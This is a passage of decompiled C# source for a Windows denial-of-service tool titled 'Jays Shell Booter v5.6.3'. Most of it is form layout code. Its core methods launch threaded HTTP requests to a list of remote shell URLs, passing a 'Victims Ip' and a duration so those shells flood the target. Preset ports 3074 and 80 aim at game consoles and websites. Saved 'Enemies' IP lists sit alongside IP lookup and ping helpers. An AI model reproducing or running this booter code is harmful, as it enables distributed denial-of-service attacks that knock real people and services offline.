		((Control)TabControlPanel4).get_Controls().Add((Control)(object)TextBoxX_0);
		((Control)TabControlPanel4).get_Controls().Add((Control)(object)LabelX7);
		((Control)TabControlPanel4).get_Controls().Add((Control)(object)TextBoxX_1);
		((Control)TabControlPanel4).get_Controls().Add((Control)(object)LabelX6);
		((Control)TabControlPanel4).get_Controls().Add((Control)(object)ListView2);
		TabControlPanel4.set_Dock((DockStyle)5);
		TabControlPanel tabControlPanel13 = TabControlPanel4;
		location = new Point(0, 26);
		((Control)tabControlPanel13).set_Location(location);
		((Control)TabControlPanel4).set_Name("TabControlPanel4");
		TabControlPanel tabControlPanel14 = TabControlPanel4;
		((Padding)(ref val))._002Ector(1);
		((Control)tabControlPanel14).set_Padding(val);
		TabControlPanel tabControlPanel15 = TabControlPanel4;
		size = new Size(323, 223);
		((Control)tabControlPanel15).set_Size(size);
		((PanelEx)TabControlPanel4).get_Style().get_BackColor1().set_Color(Color.Gray);
		((PanelEx)TabControlPanel4).get_Style().get_BackColor2().set_Color(Color.FromArgb(64, 64, 64));
		((PanelEx)TabControlPanel4).get_Style().set_Border((eBorderType)1);
		((PanelEx)TabControlPanel4).get_Style().get_BorderColor().set_Color(Color.Gray);
		((PanelEx)TabControlPanel4).get_Style().set_BorderSide((eBorderSide)11);
		((PanelEx)TabControlPanel4).get_Style().set_GradientAngle(90);
		((Control)TabControlPanel4).set_TabIndex(4);
		TabControlPanel4.set_TabItem(TabItem4);
		((Control)ButtonX5).set_AccessibleRole((AccessibleRole)43);
		ButtonX5.set_ColorTable((eButtonColor)7);
		ButtonX buttonX11 = ButtonX5;
		location = new Point(188, 185);
		((Control)buttonX11).set_Location(location);
		((Control)ButtonX5).set_Name("ButtonX5");
		ButtonX buttonX12 = ButtonX5;
		size = new Size(101, 23);
		((Control)buttonX12).set_Size(size);
		((Control)ButtonX5).set_TabIndex(6);
		((Control)ButtonX4).set_AccessibleRole((AccessibleRole)43);
		ButtonX4.set_ColorTable((eButtonColor)7);
		ButtonX buttonX13 = ButtonX4;
		location = new Point(13, 185);
		((Control)buttonX13).set_Location(location);
		((Control)ButtonX4).set_Name("ButtonX4");
		ButtonX buttonX14 = ButtonX4;
		size = new Size(100, 23);
		((Control)buttonX14).set_Size(size);
		((Control)ButtonX4).set_TabIndex(5);
		TextBoxX_0.get_Border().set_Class("TextBoxBorder");
		TextBoxX_0.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj34 = TextBoxX_0;
		location = new Point(188, 159);
		((Control)obj34).set_Location(location);
		((Control)TextBoxX_0).set_Name("TextBoxX4");
		TextBoxX obj35 = TextBoxX_0;
		size = new Size(126, 20);
		((Control)obj35).set_Size(size);
		((Control)TextBoxX_0).set_TabIndex(4);
		((Control)LabelX7).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX7).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX7).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX7).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX27 = LabelX7;
		location = new Point(119, 156);
		((Control)labelX27).set_Location(location);
		((Control)LabelX7).set_Name("LabelX7");
		LabelX labelX28 = LabelX7;
		size = new Size(63, 23);
		((Control)labelX28).set_Size(size);
		((Control)LabelX7).set_TabIndex(3);
		TextBoxX_1.get_Border().set_Class("TextBoxBorder");
		TextBoxX_1.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj36 = TextBoxX_1;
		location = new Point(38, 159);
		((Control)obj36).set_Location(location);
		((Control)TextBoxX_1).set_Name("TextBoxX3");
		TextBoxX obj37 = TextBoxX_1;
		size = new Size(75, 20);
		((Control)obj37).set_Size(size);
		((Control)TextBoxX_1).set_TabIndex(2);
		((Control)LabelX6).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX6).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX6).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX6).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX29 = LabelX6;
		location = new Point(13, 156);
		((Control)labelX29).set_Location(location);
		((Control)LabelX6).set_Name("LabelX6");
		LabelX labelX30 = LabelX6;
		size = new Size(19, 23);
		((Control)labelX30).set_Size(size);
		((Control)LabelX6).set_TabIndex(1);
		ListView2.set_CheckBoxes(true);
		ListView2.set_GridLines(true);
		ListView listView7 = ListView2;
		location = new Point(0, 0);
		((Control)listView7).set_Location(location);
		((Control)ListView2).set_Name("ListView2");
		ListView listView8 = ListView2;
		size = new Size(325, 150);
		((Control)listView8).set_Size(size);
		((Control)ListView2).set_TabIndex(0);
		ListView2.set_UseCompatibleStateImageBehavior(false);
		ListView2.set_View((View)1);
		ColumnHeader3.set_DisplayIndex(0);
		ColumnHeader3.set_Text("IP");
		ColumnHeader3.set_Width(110);
		ColumnHeader4.set_DisplayIndex(1);
		ColumnHeader4.set_Text("Description");
		ColumnHeader4.set_Width(300);
		TabItem3.set_AttachedControl((Control)(object)TabControlPanel3);
		TabItem3.set_Name("TabItem3");
		TabItem3.set_Text("Friends");
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)TextBoxX_2);
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)LabelX5);
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)LabelX4);
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)ListView1);
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)TextBoxX_3);
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)ButtonX3);
		((Control)TabControlPanel3).get_Controls().Add((Control)(object)ButtonX2);
		TabControlPanel3.set_Dock((DockStyle)5);
		TabControlPanel tabControlPanel16 = TabControlPanel3;
		location = new Point(0, 26);
		((Control)tabControlPanel16).set_Location(location);
		((Control)TabControlPanel3).set_Name("TabControlPanel3");
		TabControlPanel tabControlPanel17 = TabControlPanel3;
		((Padding)(ref val))._002Ector(1);
		((Control)tabControlPanel17).set_Padding(val);
		TabControlPanel tabControlPanel18 = TabControlPanel3;
		size = new Size(323, 223);
		((Control)tabControlPanel18).set_Size(size);
		((PanelEx)TabControlPanel3).get_Style().get_BackColor1().set_Color(Color.Gray);
		((PanelEx)TabControlPanel3).get_Style().get_BackColor2().set_Color(Color.FromArgb(64, 64, 64));
		((PanelEx)TabControlPanel3).get_Style().set_Border((eBorderType)1);
		((PanelEx)TabControlPanel3).get_Style().get_BorderColor().set_Color(Color.Gray);
		((PanelEx)TabControlPanel3).get_Style().set_BorderSide((eBorderSide)11);
		((PanelEx)TabControlPanel3).get_Style().set_GradientAngle(90);
		((Control)TabControlPanel3).set_TabIndex(3);
		TabControlPanel3.set_TabItem(TabItem3);
		TextBoxX_2.get_Border().set_Class("TextBoxBorder");
		TextBoxX_2.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj38 = TextBoxX_2;
		location = new Point(188, 159);
		((Control)obj38).set_Location(location);
		((Control)TextBoxX_2).set_Name("TextBoxX2");
		TextBoxX obj39 = TextBoxX_2;
		size = new Size(126, 20);
		((Control)obj39).set_Size(size);
		((Control)TextBoxX_2).set_TabIndex(8);
		((Control)LabelX5).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX5).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX5).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX5).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX31 = LabelX5;
		location = new Point(118, 156);
		((Control)labelX31).set_Location(location);
		((Control)LabelX5).set_Name("LabelX5");
		LabelX labelX32 = LabelX5;
		size = new Size(64, 23);
		((Control)labelX32).set_Size(size);
		((Control)LabelX5).set_TabIndex(7);
		((Control)LabelX4).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX4).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX4).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX4).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX33 = LabelX4;
		location = new Point(13, 156);
		((Control)labelX33).set_Location(location);
		((Control)LabelX4).set_Name("LabelX4");
		LabelX labelX34 = LabelX4;
		size = new Size(18, 23);
		((Control)labelX34).set_Size(size);
		((Control)LabelX4).set_TabIndex(6);
		ListView1.set_CheckBoxes(true);
		ListView1.set_GridLines(true);
		ListView listView9 = ListView1;
		location = new Point(0, 0);
		((Control)listView9).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView10 = ListView1;
		size = new Size(325, 150);
		((Control)listView10).set_Size(size);
		((Control)ListView1).set_TabIndex(5);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		ListView1.set_View((View)1);
		TextBoxX_3.get_Border().set_Class("TextBoxBorder");
		TextBoxX_3.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj40 = TextBoxX_3;
		location = new Point(37, 159);
		((Control)obj40).set_Location(location);
		((Control)TextBoxX_3).set_Name("TextBoxX1");
		TextBoxX obj41 = TextBoxX_3;
		size = new Size(75, 20);
		((Control)obj41).set_Size(size);
		((Control)TextBoxX_3).set_TabIndex(4);
		((Control)ButtonX3).set_AccessibleRole((AccessibleRole)43);
		ButtonX3.set_ColorTable((eButtonColor)7);
		ButtonX buttonX15 = ButtonX3;
		location = new Point(188, 185);
		((Control)buttonX15).set_Location(location);
		((Control)ButtonX3).set_Name("ButtonX3");
		ButtonX buttonX16 = ButtonX3;
		size = new Size(99, 23);
		((Control)buttonX16).set_Size(size);
		((Control)ButtonX3).set_TabIndex(2);
		((Control)ButtonX2).set_AccessibleRole((AccessibleRole)43);
		ButtonX2.set_ColorTable((eButtonColor)7);
		ButtonX buttonX17 = ButtonX2;
		location = new Point(13, 185);
		((Control)buttonX17).set_Location(location);
		((Control)ButtonX2).set_Name("ButtonX2");
		ButtonX buttonX18 = ButtonX2;
		size = new Size(99, 23);
		((Control)buttonX18).set_Size(size);
		((Control)ButtonX2).set_TabIndex(1);
		ColumnHeader1.set_DisplayIndex(0);
		ColumnHeader1.set_Text("IP");
		ColumnHeader1.set_Width(110);
		ColumnHeader2.set_DisplayIndex(1);
		ColumnHeader2.set_Text("Description");
		ColumnHeader2.set_Width(300);
		TabItem5.set_AttachedControl((Control)(object)TabControlPanel3);
		TabItem5.set_Name("TabItem5");
		TabItem5.set_Text("Friends");
		((Control)LabelX14).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX14).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX14).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX14).set_ForeColor(SystemColors.ActiveCaptionText);
		LabelX labelX35 = LabelX14;
		location = new Point(3, 3);
		((Control)labelX35).set_Location(location);
		((Control)LabelX14).set_Name("LabelX14");
		LabelX labelX36 = LabelX14;
		size = new Size(75, 23);
		((Control)labelX36).set_Size(size);
		((Control)LabelX14).set_TabIndex(35);
		LabelX14.set_Text("Website URL:");
		((TextBoxBase)TextBoxX_7).set_BackColor(SystemColors.ScrollBar);
		TextBoxX_7.get_Border().set_BorderColorSchemePart((eColorSchemePart)6);
		TextBoxX_7.get_Border().set_Class("TextBoxBorder");
		TextBoxX_7.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj42 = TextBoxX_7;
		location = new Point(79, 65);
		((Control)obj42).set_Location(location);
		((Control)TextBoxX_7).set_Name("TextBoxX9");
		TextBoxX obj43 = TextBoxX_7;
		size = new Size(91, 20);
		((Control)obj43).set_Size(size);
		((Control)TextBoxX_7).set_TabIndex(34);
		((Control)LabelX15).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX15).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX15).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX15).set_ForeColor(SystemColors.ActiveCaptionText);
		LabelX labelX37 = LabelX15;
		location = new Point(16, 65);
		((Control)labelX37).set_Location(location);
		((Control)LabelX15).set_Name("LabelX15");
		LabelX labelX38 = LabelX15;
		size = new Size(75, 23);
		((Control)labelX38).set_Size(size);
		((Control)LabelX15).set_TabIndex(34);
		LabelX15.set_Text("Website IP:");
		((Control)ButtonX_0).set_AccessibleRole((AccessibleRole)43);
		ButtonX_0.set_ColorTable((eButtonColor)7);
		ButtonX obj44 = ButtonX_0;
		location = new Point(3, 29);
		((Control)obj44).set_Location(location);
		((Control)ButtonX_0).set_Name("ButtonX11");
		ButtonX obj45 = ButtonX_0;
		size = new Size(191, 30);
		((Control)obj45).set_Size(size);
		((Control)ButtonX_0).set_TabIndex(34);
		ButtonX_0.set_Text("Get Website IP");
		((TextBoxBase)TextBoxX_8).set_BackColor(SystemColors.ScrollBar);
		TextBoxX_8.get_Border().set_BorderColorSchemePart((eColorSchemePart)6);
		TextBoxX_8.get_Border().set_Class("TextBoxBorder");
		TextBoxX_8.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj46 = TextBoxX_8;
		location = new Point(79, 3);
		((Control)obj46).set_Location(location);
		((Control)TextBoxX_8).set_Name("TextBoxX10");
		TextBoxX obj47 = TextBoxX_8;
		size = new Size(91, 20);
		((Control)obj47).set_Size(size);
		((Control)TextBoxX_8).set_TabIndex(32);
		TabItem7.set_AttachedControl((Control)(object)TabControlPanel5);
		TabItem7.set_Name("TabItem7");
		TabItem7.set_Text("Enemies");
		TabItem8.set_AttachedControl((Control)(object)TabControlPanel5);
		TabItem8.set_Name("TabItem8");
		TabItem8.set_Text("Enemies");
		((Control)this).set_AllowDrop(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Office2007RibbonForm)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Office2007Form)this).set_CaptionAntiAlias(false);
		size = new Size(362, 427);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TabControl1);
		smethod_1((Control)(object)this, bool_0: true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Office2007Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_Text("Jays Shell Booter v5.6.3");
		((ISupportInitialize)TabControl1).EndInit();
		TabControl1.ResumeLayout(false);
		((Control)TabControlPanel1).ResumeLayout(false);
		((Control)TabControlPanel1).PerformLayout();
		((Control)GroupPanel1).ResumeLayout(false);
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)TabControlPanel2).ResumeLayout(false);
		((Control)TabControlPanel6).ResumeLayout(false);
		((Control)TabControlPanel5).ResumeLayout(false);
		((Control)TabControlPanel4).ResumeLayout(false);
		((Control)TabControlPanel3).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e6: Expected O, but got Unknown
		((TextBox)TextBox1).set_Text("Victims Ip");
		checked
		{
			try
			{
				string text = Conversions.ToString(Registry.CurrentUser.OpenSubKey("SOFTWARE\\A Sub Name")!.GetValue("Friend List"));
				string[] array = Strings.Split(text, "|", -1, (CompareMethod)0);
				string[] array2 = array[0].Split(new char[1] { '*' });
				string[] array3 = array[1].Split(new char[1] { '^' });
				int num = array2.Length - 1;
				IEnumerator enumerator = default(IEnumerator);
				for (int i = 0; i <= num; i++)
				{
					ListViewItem val = new ListViewItem(array2[i]);
					val.get_SubItems().Add(array3[i]);
					ListView3.get_Items().Add(val);
					try
					{
						enumerator = ListView3.get_Items().GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem val2 = (ListViewItem)enumerator.Current;
							if (Operators.CompareString(val2.get_Text(), (string)null, false) == 0)
							{
								val2.Remove();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string text2 = Conversions.ToString(Registry.CurrentUser.OpenSubKey("SOFTWARE\\A Sub Name")!.GetValue("Enemies List"));
				string[] array4 = Strings.Split(text2, "|", -1, (CompareMethod)0);
				string[] array5 = array4[0].Split(new char[1] { '*' });
				string[] array6 = array4[1].Split(new char[1] { '^' });
				int num2 = array5.Length - 1;
				IEnumerator enumerator2 = default(IEnumerator);
				for (int j = 0; j <= num2; j++)
				{
					ListViewItem val3 = new ListViewItem(array5[j]);
					val3.get_SubItems().Add(array6[j]);
					ListView4.get_Items().Add(val3);
					try
					{
						enumerator2 = ListView4.get_Items().GetEnumerator();
						while (enumerator2.MoveNext())
						{
							ListViewItem val4 = (ListViewItem)enumerator2.Current;
							if (Operators.CompareString(val4.get_Text(), (string)null, false) == 0)
							{
								val4.Remove();
							}
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string smethod_0(string Host)
	{
		if (Operators.CompareString(Host, "", false) == 0)
		{
			Host = "www.google.com";
		}
		if (Host.Contains("http://"))
		{
			Host = Host.Replace("http://", "");
		}
		if (Host.Contains("Http://"))
		{
			Host = Host.Replace("Http://", "");
		}
		if (Host.Contains("/"))
		{
			Host = Host.Replace("/", "");
		}
		IPHostEntry hostEntry = Dns.GetHostEntry(Host);
		IPAddress[] addressList = hostEntry.AddressList;
		return addressList.GetValue(0)!.ToString();
	}

	private void ButtonX8_Click(object sender, EventArgs e)
	{
		((TextBox)TextBoxX_5).set_Text(smethod_0(((TextBox)TextBoxX_4).get_Text()));
	}

	private void ButtonX_3_Click(object sender, EventArgs e)
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		ListView3.get_Items().Add(((TextBox)TextBoxX_12).get_Text()).get_SubItems()
			.Add(((TextBox)TextBoxX_11).get_Text());
		string text = null;
		string text2 = null;
		if (ListView3.get_Items().get_Count() != 0)
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ListView3.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					text2 = text2 + val.get_Text() + "*";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = ListView3.get_Items().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator2.Current;
					text = text + val2.get_SubItems().get_Item(1).get_Text() + "^";
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			string value = text2 + "|" + text;
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").SetValue("Friend List", value);
			return;
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").DeleteValue("Friend List");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ButtonX1_Click(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ListView3.get_CheckedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				val.Remove();
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		string text = null;
		string text2 = null;
		if (ListView3.get_Items().get_Count() != 0)
		{
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = ListView3.get_Items().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator2.Current;
					text2 = text2 + val2.get_Text() + "*";
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator3 = default(IEnumerator);
			try
			{
				enumerator3 = ListView3.get_Items().GetEnumerator();
				while (enumerator3.MoveNext())
				{
					ListViewItem val3 = (ListViewItem)enumerator3.Current;
					text = text + val3.get_SubItems().get_Item(1).get_Text() + "^";
				}
			}
			finally
			{
				if (enumerator3 is IDisposable)
				{
					(enumerator3 as IDisposable).Dispose();
				}
			}
			string value = text2 + "|" + text;
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").SetValue("Friend List", value);
			return;
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").DeleteValue("Friend List");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ButtonX_2_Click(object sender, EventArgs e)
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		ListView4.get_Items().Add(((TextBox)TextBoxX_10).get_Text()).get_SubItems()
			.Add(((TextBox)TextBoxX_9).get_Text());
		string text = null;
		string text2 = null;
		if (ListView4.get_Items().get_Count() != 0)
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ListView4.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					text2 = text2 + val.get_Text() + "*";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = ListView4.get_Items().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator2.Current;
					text = text + val2.get_SubItems().get_Item(1).get_Text() + "^";
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			string value = text2 + "|" + text;
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").SetValue("Enemies List", value);
			return;
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").DeleteValue("Enemies List");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ButtonX_1_Click(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ListView4.get_CheckedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				val.Remove();
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		string text = null;
		string text2 = null;
		if (ListView4.get_Items().get_Count() != 0)
		{
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = ListView4.get_Items().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					ListViewItem val2 = (ListViewItem)enumerator2.Current;
					text2 = text2 + val2.get_Text() + "*";
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator3 = default(IEnumerator);
			try
			{
				enumerator3 = ListView4.get_Items().GetEnumerator();
				while (enumerator3.MoveNext())
				{
					ListViewItem val3 = (ListViewItem)enumerator3.Current;
					text = text + val3.get_SubItems().get_Item(1).get_Text() + "^";
				}
			}
			finally
			{
				if (enumerator3 is IDisposable)
				{
					(enumerator3 as IDisposable).Dispose();
				}
			}
			string value = text2 + "|" + text;
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").SetValue("Enemies List", value);
			return;
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\A Sub Name").DeleteValue("Enemies List");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_1(string string_1)
	{
		checked
		{
			int_0++;
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1 + ((TextBox)TextBox1).get_Text() + "&time=" + Conversions.ToString(NumericUpDown1.get_Value()));
				httpWebRequest.Timeout = 30000;
				httpWebRequest.Method = "GET";
				httpWebRequest.GetResponse();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			int_0--;
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			Thread[] array = new Thread[string_0.Length - 1 + 1];
			int num = string_0.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = new Thread(delegate(object a0)
				{
					method_1(Conversions.ToString(a0));
				});
				array[i].IsBackground = true;
				array[i].ApartmentState = ApartmentState.STA;
				array[i].Start(string_0[i]);
				Control.set_CheckForIllegalCrossThreadCalls(false);
				Thread.Sleep(1);
			}
			string[] array2 = new string[4]
			{
				((TextBox)TextBox1).get_Text(),
				((TextBox)TextBoxX_13).get_Text(),
				Conversions.ToString(NumericUpDown1.get_Value()) + " Secs",
				Conversions.ToString(DateAndTime.get_TimeOfDay())
			};
			ListViewItem val = new ListViewItem(array2);
			ListView5.get_Items().Add(val);
			Interaction.MsgBox((object)"Now booting. Please wait until your booting stops before starting again!", (MsgBoxStyle)0, (object)null);
		}
	}

	private void ButtonX6_Click(object sender, EventArgs e)
	{
		((Control)this).Refresh();
	}

	public void DeleteIECookies(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)Class2.Class1_0).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)Class2.Class1_0).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DeleteIECache(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
		if (Directory.Exists(folderPath + "\\Content.IE5"))
		{
			foreach (string file in ((ServerComputer)Class2.Class1_0).get_FileSystem().GetFiles(folderPath + "\\Content.IE5"))
			{
				try
				{
					((ServerComputer)Class2.Class1_0).get_FileSystem().DeleteFile(file);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		foreach (string directory in ((ServerComputer)Class2.Class1_0).get_FileSystem().GetDirectories(folderPath))
		{
			try
			{
				((ServerComputer)Class2.Class1_0).get_FileSystem().DeleteDirectory(directory, (DeleteDirectoryOption)5);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ButtonX7_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("Are you sure you want to clear your browser's cache?", "Jays Shell Booter | Clear Cache", (MessageBoxButtons)4) == 6)
		{
			DeleteIECookies(Enable: true);
			DeleteIECache(Enable: true);
		}
	}

	private void ButtonX_4_Click(object sender, EventArgs e)
	{
		((Control)Class2.Class3_0.method_0()).Show();
	}

	private void ButtonX9_Click(object sender, EventArgs e)
	{
		try
		{
			if (((ServerComputer)Class2.Class1_0).get_Network().Ping(((TextBox)TextBoxX_6).get_Text()))
			{
				((Control)Label7).set_Visible(false);
				((Control)Label6).set_Visible(true);
			}
			else
			{
				((Control)Label6).set_Visible(false);
				((Control)Label7).set_Visible(true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RadioButton1_CheckedChanged(object sender, EventArgs e)
	{
		if (RadioButton1.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("3074");
		}
		if (!RadioButton1.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void RadioButton2_CheckedChanged(object sender, EventArgs e)
	{
		if (RadioButton2.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("80");
		}
		if (!RadioButton2.get_Checked())
		{
			((TextBox)TextBoxX_13).set_Text("");
		}
	}

	private void RadioButton3_CheckedChanged(object sender, EventArgs e)
	{
		if (RadioButton3.get_Checked())
		{
